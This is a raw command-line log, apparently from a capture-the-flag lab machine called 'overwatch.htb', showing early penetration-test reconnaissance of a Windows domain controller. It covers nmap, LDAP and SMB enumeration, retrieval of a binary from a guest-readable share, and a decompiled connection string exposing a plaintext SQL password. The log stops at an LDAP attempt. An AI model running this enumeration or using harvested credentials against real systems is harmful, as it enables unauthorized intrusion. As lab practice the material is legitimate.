└─$ nmap  -sSCV 10.129.244.81  --min-rate 999   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 18:48 +1100
Host is up (0.10s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 07:48:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-12T07:48:40+00:00
|_ssl-date: 2026-02-12T07:49:20+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows


└─$ ldapsearch -x -H ldap://10.129.244.81 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=overwatch,DC=htb
namingcontexts: CN=Configuration,DC=overwatch,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=overwatch,DC=htb
namingcontexts: DC=DomainDnsZones,DC=overwatch,DC=htb
namingcontexts: DC=ForestDnsZones,DC=overwatch,DC=htb

# search result
search: 2
result: 0 Success


─$ netexec smb 10.129.244.81 -u guest -p '' --shares
[*] Initializing SMB protocol database
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest: 
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL      


└─$ smbclient //10.129.244.81/software$ --user=guest --password=''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DH        0  Sat May 17 11:27:07 2025
  ..                                DHS        0  Thu Jan  1 17:46:47 2026
  Monitoring                         DH        0  Sat May 17 11:32:43 2025

		7147007 blocks of size 4096. 959404 blocks available
smb: \> cd Monitoring\
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 11:32:43 2025
  ..                                 DH        0  Sat May 17 11:27:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 06:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 06:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 06:38:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 06:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Tue Jul 18 00:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 11:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 11:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 11:19:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 06:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 06:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 06:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sun Sep 29 04:48:00 2024
  System.Management.Automation.dll     AH   360448  Tue Jul 18 00:46:10 2017
  System.Management.Automation.xml     AH  7145771  Tue Jul 18 00:46:10 2017
  x64                                DH        0  Sat May 17 11:32:33 2025
  x86                                DH        0  Sat May 17 11:32:33 2025

		7147007 blocks of size 4096. 959377 blocks available
smb: \Monitoring\> cd x64
ls
smb: \Monitoring\x64\> ls
  .                                  DH        0  Sat May 17 11:32:33 2025
  ..                                 DH        0  Sat May 17 11:32:43 2025
  SQLite.Interop.dll                 AH  2005688  Sun Sep 29 05:18:20 2024

		7147007 blocks of size 4096. 972635 blocks available
smb: \Monitoring\x64\> cd ..
smb: \Monitoring\> mget overwatch.*
Get file overwatch.exe? y
getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (24.1 KiloBytes/sec) (average 24.1 KiloBytes/sec)
Get file overwatch.exe.config? y
getting file \Monitoring\overwatch.exe.config of size 2163 as overwatch.exe.config (5.4 KiloBytes/sec) (average 14.7 KiloBytes/sec)
Get file overwatch.pdb? y
getting file \Monitoring\overwatch.pdb of size 30208 as overwatch.pdb (53.4 KiloBytes/sec) (average 30.7 KiloBytes/sec)
smb: \Monitoring\> bye
bye: command not found
smb: \Monitoring\> exit


dnspy decomplie the exe file
// MonitoringService
// Token: 0x04000003 RID: 3
private readonly string connectionString = "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;";
// Token: 0x0600000A RID: 10 RVA: 0x000022AC File Offset: 0x000004AC
public MonitoringService()


└─$ netexec ldap 10.129.244.81 -d  overwatch.htb -u guest -p ""  -k
LDAP        10.129.244.81   389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.244.81   389    S200401          [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D0D, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.129.244.81   389    S200401          [+] overwatch.htb\guest: 


